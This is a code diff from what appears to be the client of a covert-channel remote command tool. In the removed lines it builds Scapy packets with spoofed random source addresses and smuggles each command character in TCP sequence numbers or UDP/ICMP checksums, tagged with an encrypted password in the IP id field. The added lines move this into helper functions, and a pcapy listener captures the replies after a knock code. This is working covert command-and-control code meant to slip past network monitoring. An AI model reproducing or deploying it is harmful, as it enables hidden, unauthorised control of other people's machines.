@@ -41,17 +41,9 @@ def sendCommand(command):
 	pswd = utils.encrypt(config.password)
 
 	for c in command:
-		packet = IP(dst=server, src=RandIP(), id=pswd)
-		if protocol == 'tcp':
-			proto = TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c))
-		elif protocol == 'udp':
-			proto = UDP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), chksum=ord(c))
-		elif protocol == 'icmp':
-			proto = ICMP(chksum=ord(c))
-		packet = packet/proto
-		send(packet, verbose=0)
-
-	send(IP(dst=server, id=pswd)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15), verbose=0)
+		send(utils.covertPacket(server, protocol, c, pswd), verbose=0)
+	utils.finPacket(server, protocol, pswd)
+	command = ""
 
 
 def recvThread():
@@ -59,7 +51,7 @@ def recvThread():
 	# once you get the knock code, send something back, then begin listening for stuff
 	# for now, just print data
 	cap = pcapy.open_live(interface, 65536, 1, 0)
-	fltr = "ip src " + server
+	fltr = protocol
 	cap.setfilter(fltr)
 
 	while(client.running):
@@ -80,13 +72,13 @@ def packetHandler(packet):
 		checkResult(ip, protoH, data, pacType)
 
 def checkResult(ip, proto, data, pacType):
-	global results
 	character = ''
 
+	# print pacType
 	if pacType == 'tcp':
 		character = proto[2]
 	elif pacType == 'udp':
-		character = proto[6]
+		character = proto[3]
 	elif pacType == 'icmp':
 		character = proto[2]
 
